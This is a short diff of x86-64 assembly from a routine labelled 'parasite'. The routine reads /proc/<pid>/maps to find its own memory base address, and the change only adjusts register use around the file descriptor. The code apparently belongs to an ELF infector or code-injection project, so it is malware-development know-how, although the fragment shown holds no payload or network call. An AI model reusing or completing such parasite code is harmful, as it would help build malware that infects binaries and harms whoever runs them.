@@ -85,11 +85,9 @@ parasite:
     ; 
     xor r10, r10                ; Zeroing out temporary registers
     xor r8, r8
-    xor r9, r9
     xor rdi, rdi
     xor rbx, rbx
-    mov r9b, al					; store fd in r9 for lseek
-	mov dil, al                 ; fd    : al
+    mov dil, al                 ; fd    : al
     sub sp, ALLOC_SPACE         ; allocate space for /proc/<pid>/maps memory address string 
                                 ; (Max 16 chars from file | usually 12 chars 5567f9154000)
     lea rsi, [rsp]              ; *buf  : get the content to be read on stack
